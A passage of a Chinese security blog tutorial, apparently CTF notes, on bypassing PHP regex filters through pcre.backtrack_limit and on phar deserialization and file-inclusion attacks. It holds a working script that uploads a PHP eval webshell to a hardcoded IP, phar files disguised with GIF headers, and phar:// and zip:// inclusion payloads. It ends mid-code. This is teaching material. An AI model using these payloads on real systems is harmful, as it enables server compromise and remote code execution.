title="PHP的pcre.backtrack_limit限制利用"></a>PHP的pcre.backtrack_limit限制利用</h2><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p><p><img src="D:\mdimage\image-20221004183404902.png" alt="image-20221004183404902"> </p><p>这里我用的是windows的powershell，phpstrom的shell不知道为什么不可以</p><p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会出现什么现象呢？比如：</p><p><img src="D:\mdimage\ad1ed05b-fab4-4316-96e0-06717ae7b444.829619d9800d.png" alt="image.png"></p><p>我们发送上述图片中的代码</p><p>可见，<code>preg_match</code>返回的非1和0，而是false。</p><p><code>preg_match</code>函数返回false表示此次执行失败了，我们可以调用<code>var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);</code>，发现失败的原因的确是回溯次数超出了限制：</p><p><img src="D:\mdimage\e9effb6d-fd43-41aa-9bb8-1aab366649e6.a11361f8009b.png" alt="image.png"> </p><p>所以，这道题的答案就呼之欲出了。我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(<span class="hljs-string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure><p>解释一下BytesIO</p><p>StringIO操作的只能是str，如果要操作二进制数据，就需要使用BytesIO。</p><p>BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-meta">&gt;&gt;&gt; </span>f = BytesIO()<br><span class="hljs-meta">&gt;&gt;&gt; </span>f.write(<span class="hljs-string">&#x27;中文&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-number">6</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(f.getvalue())<br><span class="hljs-string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="PCRE的另一种绕过方法"><a href="#PCRE的另一种绕过方法" class="headerlink" title="PCRE的另一种绕过方法"></a>PCRE的另一种绕过方法</h2><p>延伸一下，很多基于PHP的WAF，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL Injection&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>均存在上述问题，通过大量回溯可以进行绕过。</p><p>另外，我遇到更常见的一种WAF是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL Injection&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里涉及到了正则表达式的“非贪婪模式”。在NFA中，如果我输入<code>UNION/*aaaaa*/SELECT</code>，这个正则表达式执行流程如下：</p><ul><li><code>.+?</code>匹配到<code>/</code></li><li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>*</code></li><li><code>S</code>匹配<code>*</code>失败，回溯，再由<code>.+?</code>匹配<code>*</code></li><li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>a</code></li><li><code>S</code>匹配<code>a</code>失败，回溯，再由<code>.+?</code>匹配<code>a</code></li><li>…</li></ul><p>回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出<code>pcre.backtrack_limit</code>限制，进而绕过WAF：</p><p><img src="D:\mdimage\abf469d4-eb83-416e-8cb3-caa5d59ffb6f.b6586a5d1f9b.png" alt="image.png"></p><p>那么，如何修复这个问题呢？</p><p>其实如果我们仔细观察PHP文档，是可以看到<code>preg_match</code>函数下面的警告的：</p><p>如果用<code>preg_match</code>对字符串进行匹配，一定要使用<code>===</code>全等号来判断返回值，如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> is_php(<span class="hljs-variable">$data</span>)&#123;  <br>    return preg_match(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(is_php(<span class="hljs-variable">$input</span>) === <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-regexp">//</span> fwrite(<span class="hljs-variable">$f</span>, <span class="hljs-variable">$input</span>); ...<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，即使正则执行失败返回false，也不会进入if语句。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化</title>
    <link href="/Decemberus.github-io/2021/12/31/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/Decemberus.github-io/2021/12/31/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h1 id="0x01-前言与利用方法"><a href="#0x01-前言与利用方法" class="headerlink" title="0x01 前言与利用方法"></a>0x01 前言与利用方法</h1><p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的Black Hat上，安全研究员<code>Sam Thomas</code>分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code>，利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar:&#x2F;&#x2F;伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。这让一些看起来“人畜无害”的函数变得“暗藏杀机”，下面我们就来了解一下这种攻击手法。</p><blockquote><p>1、phar文件能够上传至服务器<br>&#x2F;&#x2F;即要求存在file_get_contents()、fopen()这种函数</p><p>2、要有可利用的魔术方法<br>&#x2F;&#x2F;这个的话用一位大师傅的话说就是利用魔术方法作为”跳板”</p><p>3、文件操作函数的参数可控，且:、&#x2F;、phar等特殊字符没有被过滤<br>&#x2F;&#x2F;一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是<code>Phar://</code>这种，如果这几个特殊字符被过滤就无法实现反序列化</p></blockquote><h1 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h1><h2 id="2-1-phar文件结构"><a href="#2-1-phar文件结构" class="headerlink" title="2.1 phar文件结构"></a>2.1 phar文件结构</h2><p>在了解攻击手法之前我们要先看一下phar的文件结构，通过查阅手册可知一个phar文件有四部分构成：</p><h3 id="1-a-stub"><a href="#1-a-stub" class="headerlink" title="1. a stub"></a>1. a <strong>stub</strong></h3><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><h3 id="2-a-manifest-describing-the-contents"><a href="#2-a-manifest-describing-the-contents" class="headerlink" title="2. a manifest describing the contents"></a>2. a <strong>manifest</strong> describing the contents</h3><p>压缩文件的属性等信息，以<strong>序列化</strong>存储；</p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><h3 id="3-the-file-contents"><a href="#3-the-file-contents" class="headerlink" title="3. the file contents"></a>3. the file <strong>contents</strong></h3><p>被压缩文件的内容。</p><h3 id="4-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#4-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="4. [optional] a signature for verifying Phar integrity (phar file format only)"></a>4. [optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)</h3><p>签名，放在文件末尾，格式如下：</p><p><img src="D:\mdimage\image-20220925150541759.png" alt="image-20220925150541759"> </p><p>从官方文档中不难看出，签证尾部的<code>01</code>代表md5加密，<code>02</code>代表sha1加密，<code>04</code>代表sha256加密，<code>08</code>代表sha512加密<br>简单的举个栗子<br>用010editor打开Phar文件</p><p><img src="D:/mdimage/b8955f27f2934e8cab39b52ffa17da77.png" alt="在这里插入图片描述"> </p><p>当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名<br>更换签名的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read() <br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型和GBMB标识</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure><h2 id="2-2-demo测试"><a href="#2-2-demo测试" class="headerlink" title="2.2 demo测试"></a>2.2 demo测试</h2><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。</p><p><strong>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-comment">//启动缓冲</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将结果放入winhex</p><p><img src="D:\mdimage\image-20220925191450340.png" alt="image-20220925191450340"> </p><p>可以明显的看到meta-data是以序列化的形式存储的：</p><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="D:\mdimage\17c4c630-b5f7-4e02-af48-160cd8fcf73a.png" alt="img"></p><p>来看一下php底层代码是如何处理的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php-src<span class="hljs-regexp">/ext/</span>phar/phar.c<br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\44a2f1dc-1c23-4638-8f6e-24fc75d68c2a.png" alt="img"> </p><p>通过一个小demo来证明一下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">phar_test1.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Destruct called&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>); <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\7497d95b-b33f-4de8-bc5e-03890aff1bd9.png" alt="img"> </p><p>其他函数当然也是可行的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">phar_test2.php<br><br><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Destruct called&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/a_random_string&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-comment">//......</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。</p><p>可以简单的解释一下这里</p><p>最开始给的代码是给了利用方法，然+后接下来是给的传输方法</p><h2 id="2-3-将phar伪造成其他格式的文件"><a href="#2-3-将phar伪造成其他格式的文件" class="headerlink" title="2.3 将phar伪造成其他格式的文件"></a>2.3 将phar伪造成其他格式的文件</h2><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<span class="hljs-comment">//删除文件</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里解释一下addFromString函数</p><blockquote><p>以字符串的形式添加一个文件到 phar 档案</p><p>public Phar::addFromString(string <code>$localname</code>, string <code>$contents</code>): void</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">localname</span><br></code></pre></td></tr></table></figure><p>文件保存到档案时的路径。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">contents</span><br></code></pre></td></tr></table></figure><p>要保存的文件内容。</p></blockquote><p><img src="D:\mdimage\6abec4c4-e0a3-4520-bbc8-de0ba69c4c65.png" alt="img"> </p><h1 id="0x03-实际利用"><a href="#0x03-实际利用" class="headerlink" title="0x03 实际利用"></a>0x03 实际利用</h1><h2 id="3-1-利用条件"><a href="#3-1-利用条件" class="headerlink" title="3.1 利用条件"></a>3.1 利用条件</h2><p>任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。</p><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol><h2 id="3-2-一个例题"><a href="#3-2-一个例题" class="headerlink" title="3.2 一个例题"></a>3.2 一个例题</h2><p><img src="D:/mdimage/1.png" alt="1"> </p><p>源代码如上图所示</p><p>没有做任何过滤，所以可以直接利用</p><h2 id="3-3-Phar协议文件包含"><a href="#3-3-Phar协议文件包含" class="headerlink" title="3.3 Phar协议文件包含"></a>3.3 Phar协议文件包含</h2><p>因为phar文件本质就是以中压缩文件，所以可以使用phar伪协议读取执行</p><p>很多网站都采用单一入口模式来作为网站文件加载模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//单一入口模式</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误显示</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//接收文件名</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//判断为空或者等于index</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//载入相应文件</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>此处就存在文件包含漏洞，可以利用伪协议（读base64那个）读取文件源码，但是只能访问php文件</p><p><img src="D:/mdimage/image-20220925204103040.png" alt="image-20220925204103040"> </p><p>如果该网站同时存在上传图片的功能，这时就可以利用phar反序列化漏洞</p><p>首先写一个 test.php，写入要执行的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将 test.php 压缩为 test.zip 注意：压缩时选择仅存储，在文件上传处上传 test.zip 文件</p><p>将 test.zip 文件后缀改为 jpg，上传 jpg 文件，在 url 中访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?r=phar:<span class="hljs-regexp">//</span>pic<span class="hljs-regexp">/test.jpg/</span>test<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/1634557719_616d5f17a02732e464802.jpeg" alt="image-20211017220537555"> </p><p>不仅可以使用phar协议，zip协议也是可以的</p><p>解释一下这里为什么要有test，这取决于phar文件时addFromString函数里参数填的什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br></code></pre></td></tr></table></figure><h2 id="3-4-zip文件包含"><a href="#3-4-zip文件包含" class="headerlink" title="3.4 zip文件包含"></a>3.4 zip文件包含</h2><p>和phar用法不同效果一致</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//单一入口模式</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误显示</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//接收文件名</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//判断为空或者等于index</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;.jpg&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将php文件后缀改为jpg（因为是include .jpg），然后用压缩软件压缩为 zip格式，再将 zip 文件后缀名改为 jpg（绕过限制方便图片上传）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?r=zip:/</span><span class="hljs-regexp">/pic/</span>test4.jpg%<span class="hljs-number">23</span>test<br><br>pic是图片保存目录<br></code></pre></td></tr></table></figure><p>这个例子只是利用了phar伪协议解析文件，并没有利用反序列化</p><h1 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h1><h2 id="4-1-更改文件格式"><a href="#4-1-更改文件格式" class="headerlink" title="4.1 更改文件格式"></a>4.1 更改文件格式</h2><p>我们利用Phar反序列化的第一步就是需要上传Phar文件到服务器，而如果服务端存在防护，比如这种</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">$<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>]==<span class="hljs-string">&quot;image/gif&quot;</span><br></code></pre></td></tr></table></figure><p>要求文件格式只能为<code>gif</code>，这个时候我们该怎么办呢？<br>这个时候我们需要朝花夕拾，重提一下PHP识别Phar文件的方式。PHP通过<code>Stub</code>里的<code>__HALT_COMPILER();</code>来识别这个文件是Phar文件，对于其他是无限制的，这个时候也就意味着我们即使对文件后缀和文件名进行更改，其实质仍然是Phar文件。</p><p>所以我们只要在前面加上gif89a从而可以绕过</p><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I am&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;.&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    <span class="hljs-variable">$obj</span> -&gt; name = <span class="hljs-string">&quot;quan9i&quot;</span>;<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">startBuffering</span>(); <span class="hljs-comment">//开始缓冲 Phar 写操作</span><br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="hljs-comment">//设置stub，添加gif文件头</span><br>    <span class="hljs-variable">$phar</span> -&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span 